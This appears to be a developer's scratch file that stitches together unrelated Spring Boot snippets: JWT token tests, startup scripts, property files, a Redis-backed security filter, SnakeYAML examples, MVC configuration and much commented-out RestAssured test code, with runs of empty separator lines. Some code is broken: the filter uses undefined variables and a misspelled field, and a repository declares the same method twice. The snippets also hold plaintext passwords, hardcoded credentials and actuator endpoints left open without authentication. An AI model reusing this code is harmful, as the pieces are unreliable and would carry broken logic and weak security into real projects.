        return name;
    }

    public void setName(String name) {
        this.name = name;
    }

    @JsonIgnore
    public String getName() {
        return name;
    }

    @JsonIgnore
    public Long getId() {
        return id;
    }

    public void setId(Long id) {
        this.id = id;
    }

}
 
 
 
import com.bfwg.common.TimeProvider;
import com.bfwg.model.User;
import org.assertj.core.util.DateUtil;
import org.junit.Before;
import org.junit.Test;
import org.mockito.InjectMocks;
import org.mockito.Mock;
import org.mockito.MockitoAnnotations;
import org.springframework.mobile.device.Device;
import org.springframework.security.core.userdetails.UserDetails;
import org.springframework.test.util.ReflectionTestUtils;

import java.sql.Timestamp;
import java.util.Date;

import static org.assertj.core.api.Assertions.assertThat;
import static org.mockito.Mockito.mock;
import static org.mockito.Mockito.when;

/**
 * Created by fan.jin on 2017-01-08.
 */
public class TokenHelperTest {

    private static final String TEST_USERNAME = "testUser";

    @InjectMocks
    private TokenHelper tokenHelper;

    @Mock
    private TimeProvider timeProviderMock;

    @InjectMocks
    DeviceDummy device;

    @Before
    public void init() {
        MockitoAnnotations.initMocks(this);

        ReflectionTestUtils.setField(tokenHelper, "EXPIRES_IN", 10); // 10 sec
        ReflectionTestUtils.setField(tokenHelper, "MOBILE_EXPIRES_IN", 20); // 20 sec
        ReflectionTestUtils.setField(tokenHelper, "SECRET", "mySecret");
    }

    @Test
    public void testGenerateTokenGeneratesDifferentTokensForDifferentCreationDates() throws Exception {
        when(timeProviderMock.now())
                .thenReturn(DateUtil.yesterday())
                .thenReturn(DateUtil.now());

        final String token = createToken(device);
        final String laterToken = createToken(device);

        assertThat(token).isNotEqualTo(laterToken);
    }

    @Test
    public void mobileTokenShouldLiveLonger() {
        Date beforeSomeTime = new Date(DateUtil.now().getTime() - 15 * 1000);

        UserDetails userDetails = mock(User.class);
        when(userDetails.getUsername()).thenReturn(TEST_USERNAME);

        when(timeProviderMock.now())
                .thenReturn(beforeSomeTime);
        device.setMobile(true);
        final String mobileToken = createToken(device);
        assertThat(tokenHelper.validateToken(mobileToken, userDetails)).isTrue();
    }

    @Test
    public void mobileTokenShouldExpire() {
        Date beforeSomeTime = new Date(DateUtil.now().getTime() - 20 * 1000);

        when(timeProviderMock.now())
                .thenReturn(beforeSomeTime);

        UserDetails userDetails = mock(User.class);
        when(userDetails.getUsername()).thenReturn(TEST_USERNAME);

        device.setMobile(true);
        final String mobileToken = createToken(device);
        assertThat(tokenHelper.validateToken(mobileToken, userDetails)).isFalse();
    }

    @Test
    public void getUsernameFromToken() throws Exception {
        when(timeProviderMock.now()).thenReturn(DateUtil.now());

        final String token = createToken(device);

        assertThat(tokenHelper.getUsernameFromToken(token)).isEqualTo(TEST_USERNAME);
    }

    @Test
    public void getCreatedDateFromToken() {
        final Date now = DateUtil.now();
        when(timeProviderMock.now()).thenReturn(now);

        final String token = createToken(device);

        assertThat(tokenHelper.getIssuedAtDateFromToken(token)).isInSameMinuteWindowAs(now);
    }

    @Test
    public void expiredTokenCannotBeRefreshed() {
        when(timeProviderMock.now())
                .thenReturn(DateUtil.yesterday());

        String token = createToken(device);
        tokenHelper.refreshToken(token, device);
    }

    @Test
    public void getAudienceFromToken() throws Exception {
        when(timeProviderMock.now()).thenReturn(DateUtil.now());
        device.setNormal(true);
        final String token = createToken(this.device);

        assertThat(tokenHelper.getAudienceFromToken(token)).isEqualTo(tokenHelper.AUDIENCE_WEB);
    }

    @Test
    public void getAudienceFromMobileToken() throws Exception {
        when(timeProviderMock.now()).thenReturn(DateUtil.now());
        device.setMobile(true);
        final String token = createToken(this.device);
        assertThat(tokenHelper.getAudienceFromToken(token)).isEqualTo(tokenHelper.AUDIENCE_MOBILE);
    }

    @Test
    public void changedPasswordCannotBeRefreshed() throws Exception {
        when(timeProviderMock.now())
                .thenReturn(DateUtil.now());

        User user = mock(User.class);
        when(user.getLastPasswordResetDate()).thenReturn(new Timestamp(DateUtil.tomorrow().getTime()));
        String token = createToken(device);
        assertThat(tokenHelper.validateToken(token, user)).isFalse();
    }

    @Test
    public void canRefreshToken() throws Exception {
        when(timeProviderMock.now())
                .thenReturn(DateUtil.now())
                .thenReturn(DateUtil.tomorrow());
        String firstToken = createToken(device);
        String refreshedToken = tokenHelper.refreshToken(firstToken, device);
        Date firstTokenDate = tokenHelper.getIssuedAtDateFromToken(firstToken);
        Date refreshedTokenDate = tokenHelper.getIssuedAtDateFromToken(refreshedToken);
        assertThat(firstTokenDate).isBefore(refreshedTokenDate);
    }

    private String createToken(Device device) {
        return tokenHelper.generateToken(TEST_USERNAME, device);
    }

}
 
 
 
 
 
 
 
import org.springframework.mobile.device.Device;
import org.springframework.mobile.device.DevicePlatform;
import org.springframework.stereotype.Component;

/**
 * Created by fanjin on 2017-10-07.
 */
@Component
public class DeviceDummy implements Device {
    private boolean normal;
    private boolean mobile;
    private boolean tablet;

    @Override
    public boolean isNormal() {
        return normal;
    }

    @Override
    public boolean isMobile() {
        return mobile;
    }

    @Override
    public boolean isTablet() {
        return tablet;
    }

    @Override
    public DevicePlatform getDevicePlatform() {
        return null;
    }

    public void setNormal(boolean normal) {
        this.normal = normal;
    }

    public void setMobile(boolean mobile) {
        this.mobile = mobile;
    }

    public void setTablet(boolean tablet) {
        this.tablet = tablet;
    }
}
 
 
 
 
 
 
 
		<dependency>
			<groupId>org.springframework.boot</groupId>
			<artifactId>spring-boot-starter-mobile</artifactId>
		</dependency>
 
 
		<dependency>
            <groupId>io.jsonwebtoken</groupId>
            <artifactId>jjwt</artifactId>
            <version>0.6.0</version>
        </dependency>
 


-----------------------------------------------------------------------------------------
https://www.programcreek.com/java-api-examples/index.php?project_name=hypery2k%2Fangular-spring-boot-sample#
-----------------------------------------------------------------------------------------
EcomPilot.io
-----------------------------------------------------------------------------------------
#!/bin/sh

# restart mysql
/etc/init.d/mysql restart

# run spring boot

java -jar /tmp/ng-spring-boot.jar  --server.port=40080 2> boot-error.log 1> boot-info.log




#!/bin/sh
java -version

serverPort=${server.port}
dbUrl="jdbc:mysql://"$DB_PORT_${mysql.port}_TCP_ADDR"/NGSPRING?useUnicode=true&characterEncoding=utf8"


echo "App name: "$1
echo "Server Port: "$serverPort
echo "DB URL: "$dbUrl

echo "starting app"
java -Djava.security.egd=file:/dev/./urandom -jar /$1.jar --flyway.url=${dbUrl} --spring.datasource.url=${dbUrl} --server.port=${serverPort} 2> /boot-error.log 1> /boot-info.log
-----------------------------------------------------------------------------------------
    @ExceptionHandler(Exception.class)
    @ResponseBody
    public ResponseEntity<?> handleErrors(Exception ex) {
        if (ex.getCause() instanceof RollbackException
                && ex.getCause().getCause() instanceof ConstraintViolationException) {
            ConstraintViolationException constraintViolationException = (ConstraintViolationException) ex.getCause().getCause();
            return new ResponseEntity<List<ValidationMessage>>(getValidationErrorResponse(constraintViolationException), HttpStatus.BAD_REQUEST);
        } else {
            LOG.error("Got unknown error", ex);
            // fallback to server error
            return new ResponseEntity<Message>(new Message(ex.getMessage()), HttpStatus.INTERNAL_SERVER_ERROR);
        }
    }
-----------------------------------------------------------------------------------------
import ngSpring.demo.domain.entities.User;
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.CrudRepository;
import org.springframework.data.repository.query.Param;

public interface UserRepository extends CrudRepository<User, String> {

    @Query(nativeQuery = true, value = "select u.user_name from user u where u.customer_id = :customerId and exists (select * from user_roles where user_id = u.user_id and role_id = 2)")
    String findControllerUserNameByCustomerId(
            @Param("customerId") String customerId);


    @Query(nativeQuery = true, value = "select u.user_name from user u, user_branches ub where u.user_id = ub.user_id and ub.branch_id = :branchId")
    String findPlanerUserNameByBranchId(@Param("branchId") String branchId);

    User findByUsernameAndDeletedFalse(String username);

    User findByUserIdAndDeletedFalse(String userId);
}
-----------------------------------------------------------------------------------------
# general
spring.application.name=angular-spring-demo
server.port=9080

# http encoding
spring.http.encoding.charset=UTF-8
spring.http.encoding.enabled=true
spring.http.encoding.force=true

# database: mysql
spring.datasource.driverClassName=com.mysql.jdbc.Driver
spring.datasource.url=jdbc:mysql://localhost/NGSPRING
spring.datasource.username=ngspring
spring.datasource.password=password
spring.jpa.hibernate.ddl-auto=update
hibernate.dialect=mysql

#flyway properties
flyway.url=jdbc:mysql://localhost/NGSPRING
flyway.user=ngspring
flyway.password=password
flyway.enabled=true

# Show or not log for each sql query
spring.jpa.show-sql = false

org.springframework.security.level=DEBUG

# monitoring
management.context-path=/actuator
endpoints.enabled=true

# pretty-print output
spring.jackson.serialization.INDENT_OUTPUT=true
spring.jackson.serialization.write-dates-as-timestamps:false
-----------------------------------------------------------------------------------------
import com.jerry.security.core.config.JerrySecurityProperties;
import com.jerry.security.core.exception.JerrySecurityCodeException;
import com.jerry.security.core.service.JerryUserInfo;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.data.redis.core.RedisTemplate;
import org.springframework.data.redis.core.ValueOperations;
import org.springframework.stereotype.Component;
import org.springframework.util.AntPathMatcher;
import org.springframework.web.filter.OncePerRequestFilter;

import javax.servlet.FilterChain;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.util.Map;

/**
 * @author jerry
 */
@Component
public class JerrySecurityFilter extends OncePerRequestFilter {
    @Autowired
    JerrySecurityProperties jerrySecurityProperties;
    @Autowired
    RedisTemplate redisTemplate;

    /**
     * Same contract as for {@code doFilter}, but guaranteed to be
     * just invoked once per request within a single request thread.
     * See {@link #shouldNotFilterAsyncDispatch()} for details.
     * <p>Provides HttpServletRequest and HttpServletResponse arguments instead of the
     * default ServletRequest and ServletResponse ones.
     *
     * @param request
     * @param response
     * @param filterChain
     */
    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException {
        String permit = jerrySecurityProperties.getConfig().getPermit();      
        String[] permits = permit.split(",");
		//Start 通配符匹配实现
        AntPathMatcher matcher = new AntPathMatcher();
        Boolean allowed = false;
        for (String path : permits) {
            if (matcher.match(path, request.getRequestURI())) {
                allowed = true;
            }
        }
		//End 通配符匹配实现
        if (!allowed) {
            try {
                securityVali(clientId, sessionId);
            } catch (Exception e) {
                response.sendRedirect(jerrSecurityProperties.getConfig().getLoginUrl());
            }
        }
        filterChain.doFilter(request, response);
    }

    private void securityVali(String clientId, String sessionId) {
        //非public请求，需要验证当前account信息是否存在
        ValueOperations vo = redisTemplate.opsForValue();
        Object userId = vo.get(clientId + sessionId);
        if (null == userId) {
            throw new JerrySecurityCodeException("userId不存在");
        }
        Object user = vo.get(userId);
        if (null == user) {
            throw new JerrySecurityCodeException("user不存在");
        }
        Map<String, JerryUserInfo> clientIdUser = (Map<String, JerryUserInfo>) user;
        Boolean cached = clientIdUser.containsKey(clientId);
        if (!cached) {
            throw new JerrySecurityCodeException("clientId对应user不存在");
        }
    }
}

jerry:
  security:
    config:
      permit: /jerry/user,/actuator/**
-----------------------------------------------------------------------------------------
  @Bean
    public FilterRegistrationBean tokenAuthenticationFilterBean() {
        FilterRegistrationBean registration = new FilterRegistrationBean(tokenAuthenticationFilter);
        registration.addUrlPatterns("/api/**","/ping","/api/*");
        return registration;
    }
-----------------------------------------------------------------------------------------
Yaml yaml = new Yaml();
InputStream inputStream = this.getClass()
 .getClassLoader()
 .getResourceAsStream("yaml/customer_with_type.yaml");
Customer customer = yaml.load(inputStream);


Yaml yaml = new Yaml(new Constructor(Customer.class));

@Test
public void
  whenLoadYAMLDocumentWithTopLevelClass_thenLoadCorrectJavaObjectWithNestedObjects() {
  
    Yaml yaml = new Yaml(new Constructor(Customer.class));
    InputStream inputStream = this.getClass()
      .getClassLoader()
      .getResourceAsStream("yaml/customer_with_contact_details_and_address.yaml");
    Customer customer = yaml.load(inputStream);
  
    assertNotNull(customer);
    assertEquals("John", customer.getFirstName());
    assertEquals("Doe", customer.getLastName());
    assertEquals(31, customer.getAge());
    assertNotNull(customer.getContactDetails());
    assertEquals(2, customer.getContactDetails().size());
     
    assertEquals("mobile", customer.getContactDetails()
      .get(0)
      .getType());
    assertEquals(123456789, customer.getContactDetails()
      .get(0)
      .getNumber());
    assertEquals("landline", customer.getContactDetails()
      .get(1)
      .getType());
    assertEquals(456786868, customer.getContactDetails()
      .get(1)
      .getNumber());
    assertNotNull(customer.getHomeAddress());
    assertEquals("Xyz, DEF Street", customer.getHomeAddress()
      .getLine());
}

<dependency>
    <groupId>org.yaml</groupId>
    <artifactId>snakeyaml</artifactId>
    <version>1.21</version>            
</dependency>
-----------------------------------------------------------------------------------------
@RestController
public class UserController {

	@GetMapping("/user")
	@JsonView(User.WithoutPasswordView.class)
	public User getUser() {
		return new User("eric", "7!jd#h23");
	}
}

@Controller
public class UserController extends AbstractController {

	@GetMapping("/user")
	public String getUser(Model model) {
		model.addAttribute("user", new User("eric", "7!jd#h23"));
		model.addAttribute(JsonView.class.getName(), User.WithoutPasswordView.class);
		return "userView";
	}
}
-----------------------------------------------------------------------------------------
@RequestMapping("/quotes")
@ResponseBody
public DeferredResult<String> quotes() {
	DeferredResult<String> deferredResult = new DeferredResult<String>();
	// Save the deferredResult somewhere..
	return deferredResult;
}

// In some other thread...
deferredResult.setResult(data);

@PostMapping
public Callable<String> processUpload(final MultipartFile file) {

	return new Callable<String>() {
		public String call() throws Exception {
			// ...
			return "someView";
		}
	};

}
-----------------------------------------------------------------------------------------
POST /someUrl
Content-Type: multipart/mixed

--edt7Tfrdusa7r3lNQc79vXuhIIMlatb7PQg7Vp
Content-Disposition: form-data; name="meta-data"
Content-Type: application/json; charset=UTF-8
Content-Transfer-Encoding: 8bit

{
	"name": "value"
}
--edt7Tfrdusa7r3lNQc79vXuhIIMlatb7PQg7Vp
Content-Disposition: form-data; name="file-data"; filename="file.properties"
Content-Type: text/xml
Content-Transfer-Encoding: 8bit
... File Data ...
-----------------------------------------------------------------------------------------
@Configuration
@EnableWebMvc
public class WebConfiguration implements WebMvcConfigurer {

	@Override
	public void configureMessageConverters(List<HttpMessageConverter<?>> converters) {
		Jackson2ObjectMapperBuilder builder = new Jackson2ObjectMapperBuilder()
				.indentOutput(true)
				.dateFormat(new SimpleDateFormat("yyyy-MM-dd"))
				.modulesToInstall(new ParameterNamesModule());
		converters.add(new MappingJackson2HttpMessageConverter(builder.build()));
		converters.add(new MappingJackson2XmlHttpMessageConverter(builder.xml().build()));
	}

}
-----------------------------------------------------------------------------------------
Paragon.UserContour.Autotests
-----------------------------------------------------------------------------------------
@Configuration
@EnableWebMvc
public class WebConfig implements WebMvcConfigurer {

	@Override
	public void configureViewResolvers(ViewResolverRegistry registry) {
		registry.enableContentNegotiation(new MappingJackson2JsonView());
		registry.freeMarker().cache(false);
	}

	@Bean
	public FreeMarkerConfigurer freeMarkerConfigurer() {
		FreeMarkerConfigurer configurer = new FreeMarkerConfigurer();
		configurer.setTemplateLoaderPath("/WEB-INF/");
		return configurer;
	}

}
-----------------------------------------------------------------------------------------
@Configuration
public class CustomWebConfiguration extends WebMvcConfigurationSupport {
     
    @Bean
    public RequestMappingHandlerMapping 
      requestMappingHandlerMapping() {
  
        RequestMappingHandlerMapping handlerMapping
          = super.requestMappingHandlerMapping();
        handlerMapping.setUseSuffixPatternMatch(false);
        return handlerMapping;
    }
}
-----------------------------------------------------------------------------------------
@RequestMapping(value = "/hello/{value}$", method = RequestMethod.GET)
public String hello(@PathVariable("value") String value, ModelMap model)
-----------------------------------------------------------------------------------------
@Bean
public RequestMappingHandlerMapping requestMappingHandlerMapping() {
    RequestMappingHandlerMapping handlerMapping = super.requestMappingHandlerMapping();
    handlerMapping.setAlwaysUseFullPath(true);
    return handlerMapping;
}
-----------------------------------------------------------------------------------------
@Component
public class IncludeExtensionsInRequestParamPostProcessor implements BeanPostProcessor {
    @Override
    public Object postProcessBeforeInitialization(Object bean, String beanName) throws BeansException {
        if (bean instanceof RequestMappingHandlerMapping) {
            RequestMappingHandlerMapping mapping = (RequestMappingHandlerMapping)bean;
            mapping.setUseRegisteredSuffixPatternMatch(false);
            mapping.setUseSuffixPatternMatch(false);
        }
        return bean;
    }

    @Override
    public Object postProcessAfterInitialization(Object bean, String beanName) { return bean; }
}
-----------------------------------------------------------------------------------------
//    @Bean
//    public CommandLineRunner run(final RestTemplate restTemplate) throws Exception {
//        return args -> {
//            final QuoteEntity quoteEntity = restTemplate.getForObject("http://gturnquist-quoters.cfapps.io/api/random", QuoteEntity.class);
//            log.info(quoteEntity.toString());
//        };
//    }
-----------------------------------------------------------------------------------------
   @Bean
    public View jsonTemplate() {
        MappingJackson2JsonView view = new MappingJackson2JsonView();
        view.setPrettyPrint(true);
        return view;
    }
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
-----------------------------------------------------------------------------------------
//    //    @Test
////    public void testForbiddenAccess() {
////        given().when().get(getServiceURI() + "/api/users").then().statusCode(401);
////    }
////
////    @Test
////    public void testAuthorizationAccess() {
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/users").then().statusCode(200);
////    }
////
////    @Test
////    public void testNotFound() {
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/userss").then().statusCode(404);
////    }
////    @Test
////    public void testVerifyUser2() {
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/2").then()
////                .body("login", equalTo("user2@gmail.com"))
////                .body("name", equalTo("user2"))
////                .body("createdBy", equalTo("user2@gmail.com"))
////                .body("age", equalTo(26))
////                .body("phone", equalTo("+79211234567"))
////                //.body("gender", equalTo(User.UserGenderType.MALE.toString()))
////                .body("id", equalTo(2))
////                .body("createdAt", equalTo("2017-04-30 00:00:00+0300"))
////                .body("modifiedAt", nullValue())
////                .body("rating", equalTo(1.0f))
////                .body("registeredAt", equalTo("2017-04-30 00:00:00+0300"))
////                .body("status", equalTo(UserAccountStatusInfo.StatusType.ACTIVE.toString()))
////                .statusCode(200);
//
//    //        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
////                .body(getObjectAsString(user))
////                .when().post(getServiceURI() + "/api/user").then()
////                .statusCode(201);
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/users").then()
////                .body("login", hasItem("user18@gmail.com"))
////                .statusCode(200);
//
//    //        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
////                .body(user1)
////                .when().put(getServiceURI() + "/api/user/{id}", user1.getId()).then()
////                .body("status", equalTo(UserAccountStatusInfo.StatusType.ACTIVE.toString()))
////                .statusCode(200);
//
//    //        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/4").then()
////                .body("login", equalTo("user18@gmail.com"))
////                .statusCode(200);
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
////                .when().delete(getServiceURI() + "/api/user/4").then()
////                .statusCode(403);
//////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("dba", "dba123")
//////                .when().delete(getServiceURI() + "/api/user/4").then()
//////                .statusCode(200);
//
//    @Override
//    public GetCouponResponse getCoupon(final GetCouponRequest couponRequest) {
//        return given()
//                .log().all()
//                .contentType(ContentType.JSON)
//                .accept(ContentType.JSON)
//                .auth().basic("user", "user123")
//                .when()
//                .get(this.buildFullPath(couponRequest))
//                .then()
//                .log().all()
//                .body("name", equalTo("subscription3"))
//                .statusCode(200)
//                .extract()
//                .as(GetCouponResponse.class);
//    }
//
//    private URI buildFullPath(final GetCouponRequest request) {
//        final EndpointProperty.RouteInfo routeInfo = this.endpointProperty.getRoutes().get("coupons-api");
//        return UriComponentsBuilder
//                .fromUriString(routeInfo.getBasePath())
//                .path(routeInfo.getSegmentPath())
//                .path("/")
//                .path(request.getSerialNumber())
//                .build()
//                .toUri();
//    }
//
//    private RequestSpecification buildRequestSpecification() {
//        return new RequestSpecBuilder()
//                .setBaseUri("http://localhost")
//                .setPort(8080)
//                .setAccept(ContentType.JSON)
//                .setContentType(ContentType.ANY)
//                .log(LogDetail.ALL)
//                .build();
//    }
////
////    private Optional<GetCouponResponse> getEmptyIfNotFoundOrRethrow(final HttpStatusCodeException e) {
////        final HttpStatus statusCode = e.getStatusCode();
////        if (!statusCode.equals(HttpStatus.NOT_FOUND)) {
////            rethrowSpecificException(e);
////        }
////        return Optional.empty();
////    }
////
////    private void rethrowSpecificException(final Exception e) {
////        rethrowRestServiceSpecificException(e, "Authority service is not available!", "Error is occurred when calling Authority service");
////    }
//}
//
//
////    RequestSpecification requestSpec = new RequestSpecBuilder()
////            .setBaseUri("http://localhost")
////            .setPort(8080)
////            .setAccept(ContentType.JSON)
////            .setContentType(ContentType.ANY)
////...
////        .log(LogDetail.ALL)
////        .build();
////
////// можно задать одну спецификацию для всех запросов:
////        RestAssured.requestSpecification = requestSpec;
////
////// или для отдельного:
////        given().spec(requestSpec)...when().get(someEndpoint);
////
////        ResponseSpecification responseSpec = new ResponseSpecBuilder()
////        .expectStatusCode(200)
////        .expectBody(containsString("success"))
////        .build();
////
////// можно задать одну спецификацию для всех ответов:
////        RestAssured.responseSpecification = responseSpec;
////
////// или для отдельного:
////        given()...when().get(someEndpoint).then().spec(responseSpec)...;
//
////// то же самое работает и в обратную сторону:
////SomePojo pojo = given().
////    .when().get(EndPoints.get)
////            .then().extract().body().as(SomePojo.class);
//
////    @Test
////    public void whenLogOnlyIfValidationFailed_thenSuccess() {
////        when().get("/users/eugenp")
////                .then().log().ifValidationFails().statusCode(200);
////
////        given().log().ifValidationFails()
////                .when().get("/users/eugenp")
////                .then().statusCode(200);
////    }
////
////    @Test
////    public void whenLogResponseIfErrorOccurred_thenSuccess() {
////
////        when().get("/users/eugenp")
////                .then().log().ifError();
////        when().get("/users/eugenp")
////                .then().log().ifStatusCodeIsEqualTo(500);
////        when().get("/users/eugenp")
////                .then().log().ifStatusCodeMatches(greaterThan(200));
////    }
//
////    @Test
////    public void whenUpdatePerson_thenStatus200() {
////        long id = createTestPerson("Nick").getId();
////        Person person = new Person("Michail");
////        given().pathParam("id", id).log()
////                .body().contentType("application/json").body(person)
////
////                .when().put("/persons/{id}")
////
////                .then().log().body().statusCode(HttpStatus.OK.value())
////                .and().body("name", equalTo("Michail"));
////    }
////
////    @Test
////    public void givenNoPerson_whenGetPerson_thenStatus500() {
////        given().pathParam("id", 1)
////                .when().get("/persons/{id}")
////
////                .then().log().body()
////                .statusCode(HttpStatus.INTERNAL_SERVER_ERROR.value());
////    }

public interface ITaskSubscriptionRepository<E extends TaskSubscriptionEntity, D extends TaskSubscriptionDTO> extends ICoreBaseRepository<E, D>, PagingAndSortingRepository<E, Long> {
    @Query(value="select v.* from Option o, Vote v where o.POLL_ID = ?1 and v.OPTION_ID = o.OPTION_ID", nativeQuery = true)
    public Iterable<E> findByPoll(final Long id);

    @Query(value="select v.* from Option o, Vote v where o.POLL_ID = ?1 and v.OPTION_ID = o.OPTION_ID", nativeQuery = true)
    public Iterable<E> findByPoll(Long pollId);
}
-----------------------------------------------------------------------------------------
//package com.paragon.microservices.autotests.common.client.coupons.service;
//
//import com.jayway.restassured.builder.RequestSpecBuilder;
//import com.jayway.restassured.filter.log.LogDetail;
//import com.jayway.restassured.http.ContentType;
//import com.jayway.restassured.specification.RequestSpecification;
//import com.paragon.microservices.autotests.common.client.coupons.model.GetCouponRequest;
//import com.paragon.microservices.autotests.common.client.coupons.model.GetCouponResponse;
//import com.paragon.microservices.autotests.system.property.EndpointProperty;
//import lombok.RequiredArgsConstructor;
//import lombok.extern.slf4j.Slf4j;
//import org.springframework.stereotype.Service;
//import org.springframework.validation.annotation.Validated;
//import org.springframework.web.util.UriComponentsBuilder;
//
//import javax.transaction.Transactional;
//import java.net.URI;
//
//import static com.jayway.restassured.RestAssured.given;
//import static org.hamcrest.CoreMatchers.equalTo;
//
//@Slf4j
//@Service
//@Validated
//@Transactional(rollbackOn = Exception.class)
//@RequiredArgsConstructor
//public class CouponClientImpl implements CouponClient {
//    private final EndpointProperty endpointProperty;
//
//    //    @Test
////    public void testForbiddenAccess() {
////        given().when().get(getServiceURI() + "/api/users").then().statusCode(401);
////    }
////
////    @Test
////    public void testAuthorizationAccess() {
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/users").then().statusCode(200);
////    }
////
////    @Test
////    public void testNotFound() {
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/userss").then().statusCode(404);
////    }
////    @Test
////    public void testVerifyUser2() {
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/2").then()
////                .body("login", equalTo("user2@gmail.com"))
////                .body("name", equalTo("user2"))
////                .body("createdBy", equalTo("user2@gmail.com"))
////                .body("age", equalTo(26))
////                .body("phone", equalTo("+79211234567"))
////                //.body("gender", equalTo(User.UserGenderType.MALE.toString()))
////                .body("id", equalTo(2))
////                .body("createdAt", equalTo("2017-04-30 00:00:00+0300"))
////                .body("modifiedAt", nullValue())
////                .body("rating", equalTo(1.0f))
////                .body("registeredAt", equalTo("2017-04-30 00:00:00+0300"))
////                .body("status", equalTo(UserAccountStatusInfo.StatusType.ACTIVE.toString()))
////                .statusCode(200);
//
//    //        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
////                .body(getObjectAsString(user))
////                .when().post(getServiceURI() + "/api/user").then()
////                .statusCode(201);
////        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/users").then()
////                .body("login", hasItem("user18@gmail.com"))
////                .statusCode(200);
//
//    //        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123")
////                .body(user1)
////                .when().put(getServiceURI() + "/api/user/{id}", user1.getId()).then()
////                .body("status", equalTo(UserAccountStatusInfo.StatusType.ACTIVE.toString()))
////                .statusCode(200);
//
//    //        given().contentType(ContentType.JSON).accept(ContentType.JSON).auth().basic("user", "user123").when().get(getServiceURI() + "/api/user/4").then()
////                .body("login", equalTo("user18@gmail.com"))
